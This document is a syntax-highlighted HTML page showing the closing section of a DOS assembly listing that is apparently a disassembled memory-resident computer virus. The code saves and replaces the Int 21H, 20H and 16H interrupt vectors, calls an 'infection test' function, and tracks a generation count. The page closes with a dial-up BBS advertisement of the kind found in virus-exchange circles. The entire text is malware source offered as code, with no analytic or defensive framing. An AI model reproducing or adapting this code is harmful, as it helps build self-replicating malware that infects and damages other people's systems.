    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0084</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">12H</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; \ Restore Int 21H segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0086</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">0BH</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; \ Restore Int 20H offset</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0080</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">9</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; \ Restore Int 20H segment</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0082</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc2">0100H</span><span class="sc0">        </span><span class="sc1">; \ Install moved area as Int 16H</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0058</span><span class="sc4">,</span><span class="sc8">CX</span><span class="sc0">       </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Test system for infection</span><span class="sc0">

</span><span class="sc5">BP02BE</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AL</span><span class="sc0">           </span><span class="sc1">; Clear register</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc2">0DDH</span><span class="sc0">         </span><span class="sc1">; Infection test function</span><span class="sc0">
    </span><span class="sc6">INT</span><span class="sc0"> </span><span class="sc2">16H</span><span class="sc0">         </span><span class="sc1">; Keyboard I/O</span><span class="sc0">
    </span><span class="sc6">CMP</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc8">AH</span><span class="sc0">           </span><span class="sc1">; Are they the same</span><span class="sc0">
    </span><span class="sc6">JNE</span><span class="sc0"> </span><span class="sc5">BP02CB</span><span class="sc0">          </span><span class="sc1">; Branch if not</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

    </span><span class="sc1">; Install interrupts</span><span class="sc0">

</span><span class="sc5">BP02CB</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">16H</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Get generation count</span><span class="sc0">
    </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BP02D4</span><span class="sc0">          </span><span class="sc1">; \ Get current address</span><span class="sc0">
</span><span class="sc5">BP02D4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc2">0040H</span><span class="sc0">        </span><span class="sc1">; \ Address system RAM</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">BX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">RAM</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc5">BW046C</span><span class="sc0">       </span><span class="sc1">; Get system clock, low word</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">DW0171</span><span class="sc4">-</span><span class="sc5">BP02D4</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0"> </span><span class="sc1">; Get system clock, low word</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">DW0173</span><span class="sc4">-</span><span class="sc5">BP02D4</span><span class="sc4">],</span><span class="sc8">BX</span><span class="sc0"> </span><span class="sc1">; Get system clock, low word</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc5">DW0175</span><span class="sc4">-</span><span class="sc5">BP02D4</span><span class="sc4">],</span><span class="sc8">DX</span><span class="sc0">   </span><span class="sc1">; Save generation count</span><span class="sc0">
    </span><span class="sc6">XOR</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; \ Address zero</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc8">AX</span><span class="sc0">           </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc5">VECTOR</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0084</span><span class="sc0">       </span><span class="sc1">; \ Save Int 21H offset (DW0260)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">74H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0086</span><span class="sc0">       </span><span class="sc1">; \ Save Int 21H segment (DW0262)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">72H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; </span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0058</span><span class="sc0">       </span><span class="sc1">; \ Save Int 16H offset (DW016D)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0FE99H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW005A</span><span class="sc0">       </span><span class="sc1">; \ Save Int 16H segment (DW016F)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">+</span><span class="sc2">0FE9BH</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">   </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0080</span><span class="sc0">       </span><span class="sc1">; \ Save Int 20H offset (DW0269)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">6BH</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc5">BW0082</span><span class="sc0">       </span><span class="sc1">; \ Save Int 20H segment (DW026B)</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:[</span><span class="sc8">SI</span><span class="sc4">-</span><span class="sc2">69H</span><span class="sc4">],</span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">CLI</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set Int 21H segment</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc5">BW0086</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0084</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">       </span><span class="sc1">; \ Set Int 21H offset (BP023C)</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc5">BW0084</span><span class="sc4">,</span><span class="sc2">0098H</span><span class="sc0">        </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set Int 20H segment</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc5">BW0082</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0080</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">       </span><span class="sc1">; \ Set Int 20H offset (BP0264)</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc5">BW0080</span><span class="sc4">,</span><span class="sc2">70H</span><span class="sc0">      </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">          </span><span class="sc1">; \ Set Int 16H segment</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc5">BW005A</span><span class="sc0">          </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc5">BW0058</span><span class="sc4">,</span><span class="sc8">SI</span><span class="sc0">       </span><span class="sc1">; \ Set Int 16H offset (BP015E)</span><span class="sc0">
    </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc5">BW0058</span><span class="sc4">,</span><span class="sc2">0176H</span><span class="sc0">        </span><span class="sc1">; /</span><span class="sc0">
    </span><span class="sc6">STI</span><span class="sc0">
    </span><span class="sc9">ASSUME</span><span class="sc0">  </span><span class="sc8">ES</span><span class="sc4">:</span><span class="sc10">NOTHING</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">
    </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">
    </span><span class="sc6">RET</span><span class="sc0">

</span><span class="sc5">ENDADR</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">CODE</span><span class="sc0">    </span><span class="sc9">ENDS</span><span class="sc0">

    </span><span class="sc9">END</span><span class="sc0">

</span><span class="sc1">; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ</span><span class="sc0">
</span><span class="sc1">; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ&gt; and Remember Don't Forget to Call &lt;ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ</span><span class="sc0">
</span><span class="sc1">; ฤฤฤฤฤฤฤฤฤฤฤฤ&gt; ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? &lt;ฤฤฤฤฤฤฤฤฤฤ</span><span class="sc0">
</span><span class="sc1">; ฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤ</span><span class="sc0">

</span></div></body>
</html>
